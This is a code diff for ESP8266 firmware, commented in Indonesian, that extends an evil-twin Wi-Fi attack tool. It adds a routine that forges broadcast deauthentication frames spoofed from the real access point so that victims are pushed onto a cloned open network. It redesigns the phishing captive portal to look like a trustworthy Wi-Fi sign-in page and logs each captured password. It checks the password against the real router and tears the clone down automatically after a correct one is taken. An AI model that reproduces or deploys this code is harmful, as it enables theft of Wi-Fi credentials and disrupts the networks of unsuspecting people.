@@ -11,6 +11,7 @@
 
 extern "C" {
   #include "user_interface.h"
+  int wifi_send_pkt_freedom(uint8_t* buf, int len, bool sys_seq);
 }
 
 #define EV_MAX_AP 24
@@ -35,48 +36,95 @@ static uint32_t s_verifyStart = 0;
 static uint32_t s_lastStat = 0;
 static bool     s_handlersSet = false;
 
+// auto-deauth AP asli (completion attack chain) — default OFF
+static bool     s_autoDeauth = false;
+static uint32_t s_lastDeauth = 0;
+static uint32_t s_deauthSent = 0;
+static uint8_t  s_dpkt[26];
+static uint32_t s_okTime     = 0;   // waktu password benar (utk auto-teardown)
+
+// Kirim broadcast deauth yang seolah dari AP asli (s_bssid) supaya
+// korban tertendang dari AP asli & pindah ke twin kita. Twin pakai
+// BSSID beda 1 byte -> client twin TIDAK ikut tertendang.
+static void send_auto_deauth() {
+  static const uint8_t bcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
+  int i = 0;
+  s_dpkt[i++] = 0xC0; s_dpkt[i++] = 0x00; s_dpkt[i++] = 0x00; s_dpkt[i++] = 0x00; // deauth
+  for (int j = 0; j < 6; j++) s_dpkt[i++] = bcast[j];     // addr1 = broadcast
+  for (int j = 0; j < 6; j++) s_dpkt[i++] = s_bssid[j];   // addr2 = AP asli (spoof)
+  for (int j = 0; j < 6; j++) s_dpkt[i++] = s_bssid[j];   // addr3 = AP asli
+  s_dpkt[i++] = 0x00; s_dpkt[i++] = 0x00;                 // seq
+  s_dpkt[i++] = 0x01; s_dpkt[i++] = 0x00;                 // reason 1
+  for (int k = 0; k < 4; k++) { if (wifi_send_pkt_freedom(s_dpkt, i, 0) == 0) s_deauthSent++; delay(1); }
+}
+
 // ----------------------------------------------------------- halaman -------
+// Gaya captive-portal "Sign in to Wi-Fi" — terang, bersih, meyakinkan.
 static String pagePortal(bool err) {
   String h = F("<!DOCTYPE html><html><head><meta charset=utf-8>"
                "<meta name=viewport content='width=device-width,initial-scale=1'>"
-               "<title>Konfigurasi Jaringan</title><style>"
-               "body{font-family:system-ui,Arial,sans-serif;background:#0b1f33;margin:0;color:#222}"
-               ".c{max-width:380px;margin:8vh auto;background:#fff;border-radius:14px;padding:26px 22px;"
-               "box-shadow:0 10px 40px rgba(0,0,0,.3)}"
-               ".lg{font-size:13px;letter-spacing:1px;color:#0a66c2;font-weight:700;text-transform:uppercase}"
-               "h2{margin:6px 0 2px;font-size:20px}p{color:#555;font-size:14px;line-height:1.5}"
-               "input{width:100%;box-sizing:border-box;padding:13px;margin:10px 0;border:1px solid #ccc;"
-               "border-radius:8px;font-size:15px}button{width:100%;padding:13px;background:#0a66c2;color:#fff;"
-               "border:0;border-radius:8px;font-size:16px;font-weight:600}"
-               ".er{background:#fde8e8;color:#b71c1c;padding:10px;border-radius:8px;font-size:13px;margin:8px 0}"
-               ".f{color:#999;font-size:11px;text-align:center;margin-top:14px}"
-               "</style></head><body><div class=c><div class=lg>Pembaruan Keamanan</div><h2>");
+               "<title>Masuk ke Wi-Fi</title><style>"
+               "*{box-sizing:border-box;margin:0;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-serif}"
+               "body{background:linear-gradient(160deg,#eef2f7,#dde5ef);min-height:100vh;display:flex;"
+               "align-items:center;justify-content:center;padding:16px}"
+               ".card{background:#fff;width:100%;max-width:360px;border-radius:18px;"
+               "box-shadow:0 14px 44px rgba(20,40,80,.20);overflow:hidden}"
+               ".top{background:linear-gradient(135deg,#1a73e8,#1457c0);padding:26px 22px 20px;color:#fff;text-align:center}"
+               ".ic{width:48px;height:48px;border-radius:50%;background:rgba(255,255,255,.18);margin:0 auto 10px;"
+               "display:flex;align-items:center;justify-content:center;font-size:24px}"
+               ".top h1{font-size:14px;font-weight:500;opacity:.92}"
+               ".ssid{font-size:20px;font-weight:700;margin-top:3px}"
+               ".bd{padding:22px}.bd p{color:#5f6b7a;font-size:13.5px;line-height:1.55;margin-bottom:15px}"
+               "label{font-size:12px;color:#8a95a3;font-weight:600}"
+               "input{width:100%;padding:13px;margin-top:6px;border:1.5px solid #d7dee7;border-radius:10px;font-size:15px;outline:none}"
+               "input:focus{border-color:#1a73e8}"
+               "button{width:100%;margin-top:16px;padding:13px;background:#1a73e8;color:#fff;border:0;"
+               "border-radius:10px;font-size:15px;font-weight:600}"
+               ".er{background:#fdecea;color:#c5221f;font-size:12.5px;padding:9px 11px;border-radius:9px;margin-bottom:13px}"
+               ".ft{text-align:center;color:#9aa4b1;font-size:11px;padding:0 22px 18px}"
+               "</style></head><body><div class=card>"
+               "<div class=top><div class=ic>&#128246;</div><h1>Sambungkan ke jaringan</h1><div class=ssid>");
   h += s_ssid;
-  h += F("</h2><p>Router Anda memerlukan verifikasi. Untuk melanjutkan koneksi internet, "
-         "masukkan kembali kata sandi WiFi Anda.</p>");
+  h += F("</div></div><div class=bd>"
+         "<p>Untuk melanjutkan akses internet, masukkan kata sandi Wi-Fi jaringan ini.</p>");
   if (err) h += F("<div class=er>Kata sandi salah. Silakan coba lagi.</div>");
   h += F("<form method=POST action=/connect>"
-         "<input type=password name=pwd placeholder='Kata sandi WiFi' required autofocus>"
-         "<button>Sambungkan</button></form>"
-         "<div class=f>Verifikasi keamanan jaringan</div></div></body></html>");
+         "<label>Kata sandi Wi-Fi</label>"
+         "<input type=password name=pwd placeholder='Masukkan kata sandi' required autofocus>"
+         "<button>Sambungkan</button></form></div>"
+         "<div class=ft>&#128274; Koneksi terenkripsi &middot; WPA2</div>"
+         "</div></body></html>");
   return h;
 }
 
 static String pageChecking() {
   return F("<!DOCTYPE html><html><head><meta charset=utf-8>"
            "<meta name=viewport content='width=device-width,initial-scale=1'>"
-           "<meta http-equiv=refresh content='3;url=/result'><title>Memverifikasi</title>"
-           "<style>body{font-family:system-ui,Arial;background:#0b1f33;color:#fff;text-align:center;padding:18vh 20px}"
-           "</style></head><body><h3>Memverifikasi koneksi...</h3>"
-           "<p>Mohon tunggu sebentar.</p></body></html>");
+           "<meta http-equiv=refresh content='3;url=/result'><title>Menyambungkan</title><style>"
+           "*{margin:0;font-family:-apple-system,'Segoe UI',Roboto,Arial,sans-serif}"
+           "body{background:linear-gradient(160deg,#eef2f7,#dde5ef);min-height:100vh;display:flex;"
+           "flex-direction:column;align-items:center;justify-content:center;color:#3a4654}"
+           ".sp{width:42px;height:42px;border:4px solid #cfd8e3;border-top-color:#1a73e8;border-radius:50%;"
+           "animation:s .9s linear infinite;margin-bottom:18px}@keyframes s{to{transform:rotate(360deg)}}"
+           "p{font-size:14px}</style></head><body>"
+           "<div class=sp></div><p>Menyambungkan ke jaringan...</p></body></html>");
 }
 
 static String pageSuccess() {
   return F("<!DOCTYPE html><html><head><meta charset=utf-8>"
-           "<meta name=viewport content='width=device-width,initial-scale=1'><title>Tersambung</title>"
-           "<style>body{font-family:system-ui,Arial;background:#0b1f33;color:#fff;text-align:center;padding:18vh 20px}"
-           "</style></head><body><h3>&#10003; Berhasil tersambung</h3>"
-           "<p>Terima kasih. Koneksi Anda telah dipulihkan.</p></body></html>");
+           "<meta name=viewport content='width=device-width,initial-scale=1'><title>Menyambungkan</title><style>"
+           "*{margin:0;box-sizing:border-box;font-family:-apple-system,'Segoe UI',Roboto,Arial,sans-serif}"
+           "body{background:linear-gradient(160deg,#eef2f7,#dde5ef);min-height:100vh;display:flex;"
+           "flex-direction:column;align-items:center;justify-content:center;color:#3a4654;text-align:center;padding:24px}"
+           ".ck{width:60px;height:60px;border-radius:50%;background:#1e9e54;color:#fff;font-size:32px;"
+           "display:flex;align-items:center;justify-content:center;margin-bottom:16px}"
+           "h3{font-size:17px;margin-bottom:6px}p{font-size:13.5px;color:#5f6b7a;line-height:1.5;margin-bottom:18px}"
+           ".bar{width:210px;height:6px;background:#d7dee7;border-radius:4px;overflow:hidden}"
+           ".bar>i{display:block;height:100%;width:0;background:#1a73e8;border-radius:4px;animation:f 8s linear forwards}"
+           "@keyframes f{to{width:100%}}.sm{margin-top:13px;font-size:11px;color:#9aa4b1}</style></head><body>"
+           "<div class=ck>&#10003;</div><h3>Kata sandi terverifikasi</h3>"
+           "<p>Menyelesaikan koneksi ke internet...<br>Mohon tunggu sebentar.</p>"
+           "<div class=bar><i></i></div><div class=sm>Jangan tutup halaman ini</div></body></html>");
 }
 
 // ----------------------------------------------------------- handlers ------
@@ -88,12 +136,13 @@ static void handleConnect() {
   IPAddress ip = s_web.client().remoteIP();
   Serial.printf("\n[evil] >>> PASSWORD DICOBA: \"%s\"  (dari %s)\n", s_pwd, ip.toString().c_str());
 
-  // mulai verifikasi ke AP asli (STA), non-blocking
+  // balas dulu, baru nyalakan STA untuk verifikasi (non-blocking)
+  s_web.send(200, "text/html", pageChecking());
+  WiFi.mode(WIFI_AP_STA);                 // sementara: AP tetap + STA untuk cek
   WiFi.begin(s_ssid, s_pwd);
   s_state   = EV_VERIFYING;
   s_verdict = V_NONE;
   s_verifyStart = millis();
-  s_web.send(200, "text/html", pageChecking());
 }
 
 static void handleResult() {
@@ -123,14 +172,20 @@ void evil_attack(const uint8_t* bssid, uint8_t ch, const char* ssid) {
   s_ch = ch;
   strncpy(s_ssid, ssid, sizeof(s_ssid)); s_ssid[sizeof(s_ssid) - 1] = 0;
   s_pwd[0] = 0; s_verdict = V_NONE;
+  s_autoDeauth = false; s_lastDeauth = 0; s_deauthSent = 0; s_okTime = 0;
 
   // bersihkan mode lain
   if (sniffer_running()) sniffer_stop();
   beacon_stop(); deauth_stop(); pdeauth_stop();
 
-  WiFi.mode(WIFI_AP_STA);
-  wifi_set_macaddr(SOFTAP_IF, s_bssid);          // clone BSSID (best-effort)
-  bool ok = WiFi.softAP(s_ssid, (const char*)NULL, s_ch);  // open, channel sama
+  // Portal jalan di mode AP MURNI -> stabil (STA tidak scan/wandering yang
+  // mengganggu DHCP). STA hanya dinyalakan sebentar saat verifikasi password.
+  // Pakai MAC default ESP (bukan clone) -> asosiasi paling andal; BSSID tetap
+  // beda dari AP asli sehingga auto-deauth tak menendang client twin sendiri.
+  WiFi.persistent(false);
+  WiFi.mode(WIFI_AP);
+  bool ok = WiFi.softAP(s_ssid, (const char*)NULL, s_ch);   // open, channel = AP asli
+  delay(100);
 
   IPAddress apip = WiFi.softAPIP();
   s_dns.setErrorReplyCode(DNSReplyCode::NoError);
@@ -171,21 +226,45 @@ void evil_loop() {
       Serial.printf("[evil]  PASSWORD BENAR: \"%s\"\n", s_pwd);
       Serial.printf("[evil]  SSID: %s\n", s_ssid);
       Serial.printf("[evil] ====================================\n");
-      WiFi.disconnect(false);                    // lepas STA, AP tetap hidup
+      WiFi.disconnect(false);
+      WiFi.mode(WIFI_AP);                        // kembali ke AP murni (stabil)
+      s_autoDeauth = false;                      // stop deauth -> korban bisa balik ke AP asli
+      s_okTime = millis();                       // mulai hitung mundur auto-teardown
     } else if (millis() - s_verifyStart > 10000) {
       s_verdict = V_WRONG; s_state = EV_PORTAL;
       Serial.printf("[evil] password SALAH: \"%s\" — portal minta ulang\n", s_pwd);
       WiFi.disconnect(false);
+      WiFi.mode(WIFI_AP);                        // kembali ke AP murni
     }
+  }
+
+  // Update A: password sudah benar -> beri jeda ~6s (biar halaman "berhasil"
+  // sempat tampil), lalu bongkar twin. Deauth sudah dimatikan, jadi HP korban
+  // otomatis reconnect ke AP asli pakai password tersimpannya (Update B).
+  if (s_verdict == V_OK && s_okTime && (millis() - s_okTime) >= 9000) {
+    Serial.println(F("[evil] selesai — twin dibongkar, korban kembali ke AP asli"));
+    evil_stop();
+    return;
+  }
+
+  // auto-deauth AP asli (hanya saat portal aktif; di-pause saat verifikasi
+  // supaya STA verifikasi kita sendiri tidak ikut tertendang)
+  if (s_autoDeauth && s_state == EV_PORTAL && (millis() - s_lastDeauth) >= 500) {
+    s_lastDeauth = millis();
+    send_auto_deauth();
   }
 
   if (millis() - s_lastStat >= 5000) {
     s_lastStat = millis();
-    Serial.printf("[evil] '%s' ch%d | client tersambung: %d%s\n",
-      s_ssid, s_ch, WiFi.softAPgetStationNum(),
-      s_verdict == V_OK ? " | PASSWORD TERTANGKAP" : "");
+    Serial.printf("[evil] '%s' ch%d | client: %d | auto-deauth: %s (%lu)%s\n",
+      s_ssid, s_ch, WiFi.softAPgetStationNum(), s_autoDeauth ? "ON" : "OFF",
+      (unsigned long)s_deauthSent, s_verdict == V_OK ? " | PASSWORD TERTANGKAP" : "");
   }
 }
+
+uint32_t evil_deauth_count() { return s_deauthSent; }
+bool     evil_deauth_on()    { return s_autoDeauth; }
+void     evil_toggle_deauth(){ s_autoDeauth = !s_autoDeauth; if (s_autoDeauth) s_lastDeauth = 0; }
 
 // -------------------------------------------------- pilih AP (capture) -----
 static void on_select(const char* line) {
